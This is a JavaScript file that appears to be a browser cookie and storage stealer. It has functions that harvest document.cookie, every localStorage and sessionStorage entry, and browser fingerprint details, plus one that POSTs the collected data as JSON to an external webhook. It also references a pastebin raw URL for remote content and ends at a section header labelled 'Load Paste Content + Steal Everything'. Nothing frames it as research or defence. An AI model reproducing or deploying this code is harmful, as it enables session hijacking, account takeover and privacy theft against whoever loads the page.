const PASTE_URL = "https://pastebin.com/raw/iiuJ4eNi";

// ===== 1. Grab Cookies =====
function grabCookies() {
    try {
        var cookies = document.cookie;
        var parsed = {};
        if (cookies) {
            cookies.split(';').forEach(function(pair) {
                var parts = pair.split('=');
                parsed[parts[0].trim()] = parts[1] || '';
            });
        }
        return { raw: cookies, parsed: parsed, count: Object.keys(parsed).length };
    } catch(e) { return { error: e.message }; }
}

// ===== 2. Grab Storage =====
function grabStorage() {
    var localData = {};
    var sessionData = {};
    try {
        for (var i = 0; i < localStorage.length; i++) {
            var key = localStorage.key(i);
            localData[key] = localStorage.getItem(key);
        }
    } catch(e) {}
    try {
        for (var i = 0; i < sessionStorage.length; i++) {
            var key = sessionStorage.key(i);
            sessionData[key] = sessionStorage.getItem(key);
        }
    } catch(e) {}
    return { localStorage: localData, sessionStorage: sessionData };
}

// ===== 3. Grab Browser Info =====
function grabInfo() {
    return {
        userAgent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform,
        screen: screen.width + "x" + screen.height,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        referrer: document.referrer,
        url: window.location.href,
        memory: navigator.deviceMemory || "N/A",
        cores: navigator.hardwareConcurrency || "N/A",
    };
}

// ===== 4. Send to Webhook =====
function sendToWebhook(data) {
    var xhr = new XMLHttpRequest();
    xhr.open("POST", WEBHOOK, true);
    xhr.setRequestHeader("Content-Type", "application/json");
    xhr.send(JSON.stringify(data));
}

// ===== 5. Load Paste Content + Steal Everything =====
